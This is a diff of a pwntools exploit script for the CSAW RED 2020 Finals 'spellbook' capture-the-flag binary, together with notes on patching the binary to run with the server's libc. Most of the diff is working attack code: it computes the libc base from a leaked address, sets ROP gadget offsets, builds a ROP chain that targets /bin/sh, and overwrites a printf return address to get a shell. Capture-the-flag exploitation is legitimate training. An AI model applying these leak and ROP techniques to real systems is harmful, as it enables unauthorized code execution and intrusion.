@@ -3,11 +3,14 @@
 from pwn import *
 from time import sleep
 
-local = True
+local = False
 if local:
-    p = process('./spellbook')
+    #p = process('./spellbook')
+    p = process('./spellbook')#, env={"LD_PRELOAD":"/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so"})
 else:
-    p = remote('pwn.red.csaw.io', 5000)
+    #p = process('./spellbook_patchelfed') # The version modified with patchelf
+    p = remote('localhost', 5000)
+    #p = remote('pwn.red.csaw.io', 5000)
 
 p.recvuntil("> ")
 
@@ -362,12 +365,12 @@ GETCHAR_LIBC_ADDR = leak_address(read_addr=GETCHAR_GOT_ADDR, spellname_registry_
 print("Found getchar_libc at " + hex(GETCHAR_LIBC_ADDR))
 #p.interactive()
 # Next get free hook and a one gadget address.
-
+#p.interactive()
 
 if local:
     PUTS_OFFSET = 0x80a30
-    FREE_HOOK_OFFSET = 0x3ed8e8
-    ONE_GADGET_OFFSET = 0x10a45c
+    #FREE_HOOK_OFFSET = 0x3ed8e8
+    #ONE_GADGET_OFFSET = 0x10a45c
     POP_RSP_OFFSET = 0x0000000000003960 # : pop rsp ; ret
     POP_RDI_OFFSET = 0x000000000002155f #: pop rdi ; ret
     POP_RSI_OFFSET = 0x0000000000023e8a #: pop rsi ; ret
@@ -377,27 +380,41 @@ if local:
     #XOR_RAX_OFFSET = 0xb1835 # xor rax, rax ; ret
     SYSCALL_OFFSET = 0x13c0
     #POP_RBX_OFFSET = 0x
-    LIBC_BASE = PUTS_LIBC_ADDR - PUTS_OFFSET
-    FREE_HOOK_ADDR = LIBC_BASE + FREE_HOOK_OFFSET
-    ONE_GADGET_ADDR = LIBC_BASE + ONE_GADGET_OFFSET
-    POP_RSP_ADDR = LIBC_BASE + POP_RSP_OFFSET
-    POP_RDI_ADDR = LIBC_BASE + POP_RDI_OFFSET
-    POP_RSI_ADDR = LIBC_BASE + POP_RSI_OFFSET
-    POP_RAX_ADDR = LIBC_BASE + POP_RAX_OFFSET
-    POP_RDX_ADDR = LIBC_BASE + POP_RDX_OFFSET
-    MOV_RAX_RDX_ADDR = LIBC_BASE + MOV_RAX_RDX_OFFSET
-    #XOR_RAX_ADDR = LIBC_BASE + XOR_RAX_OFFSET
-    SYSCALL_ADDR = LIBC_BASE + SYSCALL_OFFSET
-    print("Free hook address: " + hex(FREE_HOOK_ADDR))
-    print("One gadget address: " + hex(ONE_GADGET_ADDR))
-    print("Pop rsp address: " + hex(POP_RSP_ADDR))
+else:
+    PUTS_OFFSET = 0x68f90
+    #FREE_HOOK_OFFSET = 0x3ed8e8
+    #ONE_GADGET_OFFSET = 0x10a45c
+    POP_RSP_OFFSET = 0x0000000000003848 #: pop rsp ; ret
+    POP_RDI_OFFSET = 0x000000000001fc6a #: pop rdi ; ret
+    POP_RSI_OFFSET = 0x000000000001fc1a #: pop rsi ; ret
+    POP_RAX_OFFSET = 0x0000000000035fc8 #: pop rax ; ret
+    POP_RDX_OFFSET = 0x0000000000001b92 #: pop rdx ; ret
+    MOV_RAX_RDX_OFFSET = 0x000000000002c42c #: mov qword ptr [rdx], rax ; ret
+    #XOR_RAX_OFFSET = 0xb1835 # xor rax, rax ; ret
+    SYSCALL_OFFSET = 0x00000000000026c7 #: syscall
+    #POP_RBX_OFFSET = 0x
 
+LIBC_BASE = PUTS_LIBC_ADDR - PUTS_OFFSET
+#FREE_HOOK_ADDR = LIBC_BASE + FREE_HOOK_OFFSET
+#ONE_GADGET_ADDR = LIBC_BASE + ONE_GADGET_OFFSET
+POP_RSP_ADDR = LIBC_BASE + POP_RSP_OFFSET
+POP_RDI_ADDR = LIBC_BASE + POP_RDI_OFFSET
+POP_RSI_ADDR = LIBC_BASE + POP_RSI_OFFSET
+POP_RAX_ADDR = LIBC_BASE + POP_RAX_OFFSET
+POP_RDX_ADDR = LIBC_BASE + POP_RDX_OFFSET
+MOV_RAX_RDX_ADDR = LIBC_BASE + MOV_RAX_RDX_OFFSET
+#XOR_RAX_ADDR = LIBC_BASE + XOR_RAX_OFFSET
+SYSCALL_ADDR = LIBC_BASE + SYSCALL_OFFSET
+#print("Free hook address: " + hex(FREE_HOOK_ADDR))
+#print("One gadget address: " + hex(ONE_GADGET_ADDR))
+print("Pop rsp address: " + hex(POP_RSP_ADDR))
 
+#p.interactive()
 # CREATE THE ROP CHAIN HERE
 #def write_short(write_addr, byte, spellname_registry_addr, reset_registry_addr=True):
 ROP_CHAIN_BASE_ADDR = SPELLNAME_REGISTRY_ADDR + 0xd00
 print("ROP Chain base address: " + hex(ROP_CHAIN_BASE_ADDR))
-rop_chain = "ABCDEFGH"
+#rop_chain = "ABCDEFGH"
 
 BINSH_STRING_ADDR = ROP_CHAIN_BASE_ADDR + 0x200
 rop_chain = p64(POP_RDX_ADDR)
@@ -433,12 +450,12 @@ write_payload(rop_chain, ROP_CHAIN_BASE_ADDR, SPELLNAME_REGISTRY_ADDR)
 
 #write_long(ACCESS_SPELLBOOK_ADDR, FREE_HOOK_ADDR)
 #p.interactive()
-print("FREE_HOOK Address: " + hex(FREE_HOOK_ADDR))
-print("Access Spellbook address: " + hex(ACCESS_SPELLBOOK_ADDR))
+#print("FREE_HOOK Address: " + hex(FREE_HOOK_ADDR))
+#print("Access Spellbook address: " + hex(ACCESS_SPELLBOOK_ADDR))
 
 # Simulating the size of the ROP chain, want to make sure I don't run out of stack
 
-ROP_CHAIN_BASE_ADDR = SPELLNAME_REGISTRY_ADDR + 0xd00
+#ROP_CHAIN_BASE_ADDR = SPELLNAME_REGISTRY_ADDR + 0xd00
 #for i in range(15): # Can make it really small and jump to a one gadget if I need to because [rsp+0x70] is null
 #    print("*****************")
 #    print("i = " + str(i))
@@ -464,9 +481,17 @@ OLD_RBP_ADDR = leak_stack_address()
 #dest1 = OLD_RBP_ADDR
 #content2 = RUNCHALLENGE_LEAVE_ADDR
 #dest2 = FREE_HOOK_ADDR
+#p.interactive()
 
+# On the server:
+# I want to write to 0x7fff125d4968, that's the return address from PRINTF_POSITIONAL
+# I leaked a stack address at 0x7fff125d7bd0
 
-OFFSET_TO_PRINTF_POSITIONAL_RET_ADDR = 0x32a8 # 0x30e8 if we've used the free_hook
+if local:
+    OFFSET_TO_PRINTF_POSITIONAL_RET_ADDR = 0x32a8 # 0x30e8 if we've used the free_hook
+else:
+    OFFSET_TO_PRINTF_POSITIONAL_RET_ADDR = 0x3268
+
 PRINTF_POSITIONAL_RET_ADDR = OLD_RBP_ADDR - OFFSET_TO_PRINTF_POSITIONAL_RET_ADDR
 print("printf positional return address should be at " + hex(PRINTF_POSITIONAL_RET_ADDR))
 
@@ -711,6 +736,32 @@ p.interactive()
 
 #### Notes follow
 '''
+Getting spellbook to run with the server's libc:
+ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ patchelf --set-rpath "/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so" spellbook
+warning: working around a Linux kernel bug by creating a hole of 2093056 bytes in 'spellbook'
+
+Got the libc from 
+https://libc.blukat.me/
+
+Got the linker for this binary from 
+https://debian.pkgs.org/9/debian-main-amd64/libc6_2.24-11+deb9u4_amd64.deb.html
+
+Got patchelf from https://github.com/NixOS/patchelf
+
+And ran
+ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ patchelf --set-interpreter "/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/ld-2.24.so" --set-rpath "/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so" spellbook
+warning: working around a Linux kernel bug by creating a hole of 2093056 bytes in 'spellbook'
+ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ ldd spellbook
+    linux-vdso.so.1 (0x00007ffc4e2e5000)
+    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4d4773d000)
+    /home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/ld-2.24.so => /lib64/ld-linux-x86-64.so.2 (0x00007f4d47d32000)
+ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ patchelf --add-needed "/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so" spellbook
+ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ ldd spellbook
+    linux-vdso.so.1 (0x00007ffc1bb71000)
+    /home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so (0x00007f97f9840000)
+    /home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/ld-2.24.so => /lib64/ld-linux-x86-64.so.2 (0x00007f97f9de4000)
+
+
 ROPGadget ROP chain:
     p += pack('<Q', 0x0000000000001b96) # pop rdx ; ret
     p += pack('<Q', 0x00000000003eb1a0) # @ .data
